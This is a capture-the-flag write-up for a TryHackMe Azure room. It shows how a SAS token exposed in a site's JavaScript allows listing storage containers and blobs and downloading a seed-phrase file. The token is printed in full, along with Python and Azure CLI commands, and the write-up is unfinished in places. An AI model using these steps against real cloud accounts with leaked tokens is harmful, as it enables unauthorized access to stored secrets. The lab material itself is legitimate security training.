# URL
https://tryhackme.com/room/hh-cryptocabana-f81cac95
# Concept
* Azure cloud security
* enumerating Azure SAS token security
* enumerating Azure containers and blobs
  * retrieving previous versions of blobs
* enumerating Azure key vault containers / blobs
# Method of solve
* we're directed to a website with an Azure-integrated web app `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`
* the `app.js` script that the landing page uses includes data that we can use to enumerate the Azure containers associated with app:
```JS
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```
* what we should pay attention to here are the permissions on the SAS token's `ss`, `sp`, and `srt` parameters
  * `ss` is allowed storage devices, and is set to `b`, blob storage
  * `sp` is storage permissions, and is set to `rl`, read and list
  * `srt` is allowed resource type, and is set to `sco`, service, container, object
* with this information, we can enumerate all of the containers associated with the `cryptocabanaf5scjagc` account
## Enumerating the Storage Containers
* using the methods below, we discover there are three containers, `$web`, `backup`, and `vault`
### With Python
```Python
# pip install azure-storage-blob

from azure.storage.blob import BlobServiceClient

storage_account = "cryptocabanaf5scjagc"

sas_token = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"

account_url = f"https://{storage_account}.blob.core.windows.net"

client = BlobServiceClient(
  account_url=account_url,
  credential=sas_token
)

for container in client.list_containers():
  print(container["name"])
```
### With Azure CLI
```Bash
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | grep "name"
```
## Listing the Blobs from the Containers
* next, we want to list all the blobs (files) from the containers, and discover the `backup-service-account.json` file
### With Azure CLI
```
STORAGE_ACCOUNT="cryptocabanaf5scjagc"
SAS_TOKEN="?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
az storage blob list \    
  --account-name "$STORAGE_ACCOUNT" \
  --container-name vault \
  --sas-token "$SAS_TOKEN" \
  --query "[].name" \       
  --output tsv
```
### With Python
```Python
# pip install azure-storage-blob

from azure.storage.blob import BlobServiceClient

storage_account = "cryptocabanaf5scjagc"
container_name = "vault"

sas_token = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"

account_url = f"https://{storage_account}.blob.core.windows.net"

service_client = BlobServiceClient(
  account_url=account_url,
  credential=sas_token
)

container_client = service_client.get_container_client(container_name)

for blob in container_client.list_blobs():
  print(blob.name)
```
## Downloading the Blob from the Container
* now to download the `backup-service-account.json` file
### With Azure CLI
```Bash
az storage blob download \
  --account-name "$STORAGE_ACCOUNT" \
  --container-name vault \
  --name seed_phrase.txt \
  --sas-token "$SAS_TOKEN" \
  --file seed_phrase.txt
```
### With Python
```Python

```
